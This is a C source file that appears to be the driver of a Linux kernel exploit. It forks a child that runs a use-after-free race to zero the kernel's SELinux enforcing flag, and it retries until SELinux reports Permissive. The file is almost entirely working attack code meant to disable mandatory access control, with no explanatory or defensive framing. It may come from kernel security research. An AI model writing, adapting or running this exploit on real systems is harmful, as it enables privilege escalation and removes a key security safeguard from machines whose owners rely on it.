#include "common.h"
#include "target.h"
#include "kernelsnitch/utils.h"

#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

enum {
	REDIRECT_TIMEOUT_SECONDS = 240,
	ZERO_ATTEMPTS = 2,
};

static uint64_t monotonic_ms(void)
{
	struct timespec t;

	clock_gettime(CLOCK_MONOTONIC, &t);
	return (uint64_t)t.tv_sec * 1000ULL + (uint64_t)t.tv_nsec / 1000000ULL;
}

static int wait_child_timeout(pid_t pid, unsigned int timeout_seconds,
			       bool process_group)
{
	uint64_t deadline = monotonic_ms() + (uint64_t)timeout_seconds * 1000ULL;
	int status;

	for (;;) {
		pid_t r = waitpid(pid, &status, WNOHANG);

		if (r == pid) {
			if (process_group)
				(void)kill(-pid, SIGKILL);
			return WIFEXITED(status) ? WEXITSTATUS(status) : 128;
		}
		if (r < 0)
			return -1;
		if (monotonic_ms() >= deadline)
			break;
		usleep(10000);
	}
	(void)kill(process_group ? -pid : pid, SIGKILL);
	while (waitpid(pid, &status, 0) < 0 && errno == EINTR)
		;
	return -1;
}

/* Fork the UAF race in zero mode and wait for it to report success. */
static int run_redirect_zero(uint64_t target)
{
	pid_t pid = fork();

	if (pid < 0)
		return -1;
	if (pid == 0) {
		(void)setpgid(0, 0);
		_exit(late_refs_zero(target));
	}
	(void)setpgid(pid, pid);
	return wait_child_timeout(pid, REDIRECT_TIMEOUT_SECONDS, true);
}

int main(void)
{
	unsigned char *skb_data;
	int initial_enforcing;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	set_unbuffer();
	set_limit();
	pin_to_core(CORE);

	initial_enforcing = selinux_enforcing();
	printf("ENV uid=%u selinux=%s\n", getuid(),
	       initial_enforcing == 1 ? "Enforcing" :
	       initial_enforcing == 0 ? "Permissive" : "unknown");
	if (initial_enforcing != 1) {
		printf("RESULT SKIP selinux_not_enforcing\n");
		return 1;
	}

	skb_data = malloc(65536);
	if (!skb_data) {
		printf("RESULT FAIL allocate_skb\n");
		return 1;
	}
	memset(skb_data, 0, 65536);
	known_page_prepare(skb_data);

	printf("STAGE selinux_zero target=0x%016llx\n",
	       (unsigned long long)TARGET_SELINUX_ENFORCING_ALIAS);
	for (int attempt = 1; attempt <= ZERO_ATTEMPTS; attempt++) {
		if (run_redirect_zero(TARGET_SELINUX_ENFORCING_ALIAS) == 0 &&
		    selinux_enforcing() == 0) {
			printf("SELINUX_AFTER Permissive\n");
			printf("RESULT PASS selinux_zero attempt=%d\n", attempt);
			return 0;
		}
		printf("SELINUX_RETRY attempt=%d enforcing=%d\n", attempt,
		       selinux_enforcing());
	}
	printf("RESULT FAIL selinux_zero\n");
	return 1;
}
